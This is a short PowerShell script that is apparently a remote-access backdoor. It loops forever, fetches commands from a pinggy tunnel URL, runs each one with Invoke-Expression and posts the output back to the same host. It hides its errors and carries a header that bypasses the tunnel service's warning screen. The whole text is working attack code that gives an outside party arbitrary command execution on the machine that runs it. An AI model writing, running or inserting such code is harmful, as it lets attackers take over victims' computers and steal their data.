$u = 'https://lfynh-84-126-116-174.run.pinggy-free.link'
$headers = @{"X-Pinggy-No-Screen" = "true"}

while ($true) {
    try {
        $c = (Invoke-WebRequest -Uri $u -Headers $headers -UseBasicParsing).Content
        if ($c -and $c -ne 'OK') {
            $r = iex $c 2>&1 | Out-String
            Invoke-WebRequest -Uri $u -Method POST -Body $r -Headers $headers -UseBasicParsing
        }
    } catch {}
    Start-Sleep -Seconds 3
}
